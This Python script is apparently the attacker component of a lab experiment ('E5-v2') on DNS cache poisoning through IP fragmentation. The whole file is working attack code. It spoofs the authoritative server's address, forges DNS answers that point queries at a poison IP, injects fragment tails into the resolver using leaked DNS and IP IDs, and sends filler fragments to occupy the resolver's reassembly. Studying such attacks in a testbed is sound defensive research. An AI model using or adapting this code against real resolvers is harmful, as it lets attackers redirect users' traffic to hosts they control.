#!/usr/bin/env python3
"""The single external attacker process used by E5-v2."""

from __future__ import annotations

import json
import hashlib
import os
import socket
import threading
import time
from pathlib import Path
from typing import Any

from scapy.all import send  # type: ignore

from wire import build_poison_answer, fit_body, fragment_udp_payload


ATTACKER_IP = os.environ.get("ATTACKER_IP", "10.82.0.200")
AUTH_IP = os.environ.get("AUTH_IP", "10.82.0.100")
RESOLVER_IP = os.environ.get("RESOLVER_IP", "10.81.0.53")
NOTIFY_PORT = int(os.environ.get("NOTIFY_PORT", "9999"))
POISON_IP = os.environ.get("POISON_IP", "6.6.6.6")
FRAGSIZE = int(os.environ.get("FRAGSIZE", "40"))
SCHEDULE_PATH = Path(os.environ.get("SCHEDULE_FILE", "/app/schedule.json"))
LOG_DIR = Path(os.environ.get("LOG_DIR", "/app/log"))
RUN_ID = os.environ.get("RUN_ID", "unregistered")
REP = int(os.environ.get("REP", "0"))
POLICY = os.environ.get("POLICY_MODE", "unregistered")
WORKLOAD = os.environ.get("WORKLOAD", "unregistered")


class EventLog:
    def __init__(self) -> None:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self.path = LOG_DIR / "attacker_events.jsonl"
        self.lock = threading.Lock()
        self.path.write_text("", encoding="utf-8")

    def write(self, event: str, **fields: Any) -> None:
        qname = fields.get("qname")
        trial_id = None
        if isinstance(qname, str):
            trial_id = qname.rstrip(".").split(".", 1)[0]
        row = {
            "schema_version": 1,
            "event": event,
            "run_id": RUN_ID,
            "rep": REP,
            "policy": POLICY,
            "workload": WORKLOAD,
            "mono_ns": time.monotonic_ns(),
            "wall_ns": time.time_ns(),
            "trial_id": trial_id,
            **fields,
        }
        with self.lock, self.path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, sort_keys=True, allow_nan=False) + "\n")


def load_schedule() -> dict[str, Any]:
    return json.loads(SCHEDULE_PATH.read_text(encoding="utf-8"))


def occupancy_payload(seq: int) -> bytes:
    # Destination port 9 is intentionally non-DNS.  It still creates a
    # genuine IPv4 non-initial fragment at the routed IPS for B5 occupancy.
    return b"E5V2-OCCUPANCY-" + f"{seq:08d}".encode("ascii") + b"-" + (b"O" * 36)


def send_occupancy(seq: int, ipid: int) -> int:
    packets = fragment_udp_payload(
        src=ATTACKER_IP,
        dst=RESOLVER_IP,
        ipid=ipid,
        dst_port=9,
        body=occupancy_payload(seq),
        fragsize=FRAGSIZE,
        src_port=9,
    )
    send(packets, verbose=0)
    return len(packets)


class ExternalAttacker:
    def __init__(self) -> None:
        self.schedule = load_schedule()
        self.log = EventLog()
        self.stop_event = threading.Event()
        self.notify_sock: socket.socket | None = None

    def notify_loop(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", NOTIFY_PORT))
        sock.settimeout(0.5)
        self.notify_sock = sock
        self.log.write("attacker_ready", notify_port=NOTIFY_PORT, schedule_trials=len(self.schedule.get("trials", [])))
        while not self.stop_event.is_set():
            try:
                payload, source = sock.recvfrom(8192)
            except socket.timeout:
                continue
            try:
                info = json.loads(payload.decode("utf-8"))
                qname = str(info["qname"])
                body = fit_body(
                    build_poison_answer(int(info["dns_id"]), qname, POISON_IP),
                    int(info.get("dns_len") or 0),
                )
                packets = fragment_udp_payload(
                    src=AUTH_IP,
                    dst=RESOLVER_IP,
                    ipid=int(info["ipid"]),
                    dst_port=int(info["dport"]),
                    body=body,
                    fragsize=FRAGSIZE,
                )
                tails = packets[1:]
                if not tails:
                    raise RuntimeError("forged response did not have a non-initial tail")
                send(tails, verbose=0)
                self.log.write(
                    "forged_tail_send",
                    qname=qname,
                    source_ip=source[0],
                    ipid=int(info["ipid"]),
                    dport=int(info["dport"]),
                    dns_id=int(info["dns_id"]),
                    dns_len=len(body),
                    fragment_count=len(tails),
                    packet_sha256=[hashlib.sha256(bytes(fragment)).hexdigest() for fragment in tails],
                )
            except Exception as exc:
                self.log.write("forged_tail_error", error=repr(exc))
        sock.close()

    def occupancy_loop(self) -> None:
        rows = self.schedule.get("occupancy", [])
        start = time.monotonic()
        for row in rows:
            target = start + float(row["at_s"])
            while True:
                remaining = target - time.monotonic()
                if remaining <= 0:
                    break
                if self.stop_event.wait(min(remaining, 0.05)):
                    return
            try:
                count = send_occupancy(int(row["seq"]), int(row["ipid"]))
                self.log.write(
                    "occupancy_send",
                    seq=int(row["seq"]),
                    ipid=int(row["ipid"]),
                    fragment_count=count,
                    at_s=float(row["at_s"]),
                )
            except Exception as exc:
                self.log.write("occupancy_error", seq=int(row["seq"]), error=repr(exc))

    def run(self) -> None:
        notify = threading.Thread(target=self.notify_loop, daemon=True)
        notify.start()
        # Give the listener a chance to bind before an authoritative UDP
        # response can arrive.
        deadline = time.monotonic() + 5.0
        while self.notify_sock is None and time.monotonic() < deadline:
            time.sleep(0.01)
        self.occupancy_loop()
        # Keep the one external attacker alive after the finite occupancy
        # replay; late authoritative notifications must still be handled.
        try:
            while not self.stop_event.wait(1.0):
                pass
        except KeyboardInterrupt:
            self.stop_event.set()
        notify.join(timeout=2.0)


if __name__ == "__main__":
    ExternalAttacker().run()
